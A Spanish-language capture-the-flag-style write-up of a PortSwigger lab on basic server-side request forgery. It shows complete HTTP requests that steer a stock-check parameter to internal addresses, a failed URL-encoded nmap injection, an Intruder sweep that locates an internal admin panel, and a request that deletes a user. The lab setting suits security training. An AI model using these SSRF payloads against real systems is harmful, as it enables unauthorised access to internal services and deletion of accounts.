# 🍻 Laboratorio: SSRF básico contra otro sistema back-end

### Ataques SSRF contra otros sistemas back-end

En algunos casos, el servidor de aplicaciones puede interactuar con sistemas back-end a los que los usuarios no pueden acceder directamente. Estos sistemas suelen tener direcciones IP privadas no enrutables. Los sistemas back-end normalmente están protegidos por la topología de la red, por lo que a menudo tienen una postura de seguridad más débil. En muchos casos, los sistemas internos de back-end contienen funciones confidenciales a las que puede acceder sin autenticación cualquier persona que pueda interactuar con los sistemas.

En el ejemplo anterior, imagine que hay una interfaz administrativa en la URL de back-end `https://192.168.0.68/admin`. Un atacante puede enviar la siguiente solicitud para explotar la vulnerabilidad SSRF y acceder a la interfaz administrativa:

`POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://192.168.0.68/admin`

### Laboratorio: SSRF básico frente a otro sistema back-end

APRENDIZ

LABORATORIONo resuelto

Este laboratorio tiene una función de verificación de existencias que obtiene datos de un sistema interno.

Para resolver la práctica de laboratorio, use la función de verificación de existencias para escanear el `192.168.0.X`rango interno en busca de una interfaz de administración en el puerto 8080 y luego úsela para eliminar el usuario `carlos`.

```python
// Some code

Laboratorio: SSRF básico frente a otro sistema back-end






URL DE ITEM DONDE VEMOS UNA APARENTE API DE CONTROL DE STOCK:



https://0ad8007404d8f40182a270fe00ec00c9.web-security-academy.net/product?productId=3





REQUEST:



POST /product/stock HTTP/2
Host: 0ad8007404d8f40182a270fe00ec00c9.web-security-academy.net
Cookie: session=BNzmOdoi9esMqUROY4QxQ1w5RagDhWBw
Content-Length: 96
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0ad8007404d8f40182a270fe00ec00c9.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ad8007404d8f40182a270fe00ec00c9.web-security-academy.net/product?productId=3
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9

stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D3%26storeId%3D2




VEMOS LA URL DE CONSULTA DE BACKEND EN TEXTO PLANO:

http://192.168.0.1:8080/product/stock/check?productId=3&storeId=2



PROBAMOS HACER UN ESCANEO PARA VER LA IP PRIVADA CORRESPONDIENTE EXACTA DE LA MAQUINA BACKEND QUE MANEJA EL PANEL DE ADMIN:



REQUEST:



POST /product/stock HTTP/2
Host: 0ad8007404d8f40182a270fe00ec00c9.web-security-academy.net
Cookie: session=BNzmOdoi9esMqUROY4QxQ1w5RagDhWBw
Content-Length: 32
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0ad8007404d8f40182a270fe00ec00c9.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ad8007404d8f40182a270fe00ec00c9.web-security-academy.net/product?productId=3
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9

stockApi=nmap -sP 192.168.1.0/24




RESPONSE:

HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 98

"Invalid external stock check url 'Illegal character in path at index 4: nmap -sP 192.168.1.0/24'"





PROBAMOS EVADIR DETECCION CODIFICANDO EL ESCANEO EN URL:




%6e%6d%61%70%20%2d%73%50%20%31%39%32%2e%31%36%38%2e%31%2e%30%2f%32%34





REQUEST:


POST /product/stock HTTP/2
Host: 0ad8007404d8f40182a270fe00ec00c9.web-security-academy.net
Cookie: session=BNzmOdoi9esMqUROY4QxQ1w5RagDhWBw
Content-Length: 78
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0ad8007404d8f40182a270fe00ec00c9.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ad8007404d8f40182a270fe00ec00c9.web-security-academy.net/product?productId=3
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9

stockApi=%6e%6d%61%70%20%2d%73%50%20%31%39%32%2e%31%36%38%2e%31%2e%30%2f%32%34





RESPONSE IGUAL:


HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 98

"Invalid external stock check url 'Illegal character in path at index 4: nmap -sP 192.168.1.0/24'"







NOS DIMOS QEU EL SCANEO LO PUDIMOS HACER AL FINAL SOLO DESDE OTRO ENFOQUE USANDO INTRUDEER DEL MISMO BURP SUITE, ATACANDO CON SNIPER SOBRE EL ULTIMO OCTETO DE LA URL DE ADMIN Y BINGO NOS DIO QUE EL ULTIMO OCTETO DE LA MAQUINA LOCAL QUE MANEHA EL BACKEND DEL PANEL ADMIN ES LA TERMINADA EN 92:



ATAQUE SNIPER SOBRE ULTIMO OCTETO:




POST /product/stock HTTP/2
Host: 0ad8007404d8f40182a270fe00ec00c9.web-security-academy.net
Cookie: session=BNzmOdoi9esMqUROY4QxQ1w5RagDhWBw
Content-Length: 38
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0ad8007404d8f40182a270fe00ec00c9.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ad8007404d8f40182a270fe00ec00c9.web-security-academy.net/product?productId=3
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9

stockApi=http://192.168.0.§num§:8080/admin




REQUEST CORRECTA:



POST /product/stock HTTP/2
Host: 0ad8007404d8f40182a270fe00ec00c9.web-security-academy.net
Cookie: session=BNzmOdoi9esMqUROY4QxQ1w5RagDhWBw
Content-Length: 39
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0ad8007404d8f40182a270fe00ec00c9.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ad8007404d8f40182a270fe00ec00c9.web-security-academy.net/product?productId=3
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Connection: keep-alive

stockApi=http://192.168.0.92:8080/admin





REQUEST CORRECTA DEL ADMIN TARS EL ATAQUE:




HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3139

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Basic SSRF against another back-end system</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Basic SSRF against another back-end system</h2>
                            <a class=link-back href='https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/admin">Admin panel</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/http://192.168.0.92:8080/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/http://192.168.0.92:8080/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
                    <br>
                    <hr>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>




PROBAMOS BORRAR AHORA A CARLOS:




REQUEST:




POST /product/stock HTTP/2
Host: 0ad8007404d8f40182a270fe00ec00c9.web-security-academy.net
Cookie: session=BNzmOdoi9esMqUROY4QxQ1w5RagDhWBw
Content-Length: 62
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0ad8007404d8f40182a270fe00ec00c9.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ad8007404d8f40182a270fe00ec00c9.web-security-academy.net/product?productId=3
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9

stockApi=http://192.168.0.92:8080/admin/delete?username=carlos




RESPONSE:



HTTP/2 302 Found
Location: http://192.168.0.92:8080/admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0

```
